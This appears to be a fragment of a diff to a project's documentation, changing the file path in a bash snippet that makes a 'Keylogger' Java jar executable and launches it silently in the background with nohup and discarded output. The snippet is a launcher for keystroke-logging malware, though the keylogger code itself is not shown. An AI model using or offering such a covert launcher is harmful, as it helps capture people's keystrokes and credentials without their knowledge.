@@ -54,7 +54,7 @@
 
 ```bash
 #!/bin/bash
-JAR_PATH="/home/toor/Downloads/stroe/Keylogger/target/Keylogger-1.0-SNAPSHOT.jar"
+JAR_PATH="/home/Keylogger/target/Keylogger-1.0-SNAPSHOT.jar"
 chmod 700 "$JAR_PATH"
 nohup java -jar "$JAR_PATH" >/dev/null 2>&1 &
 ```
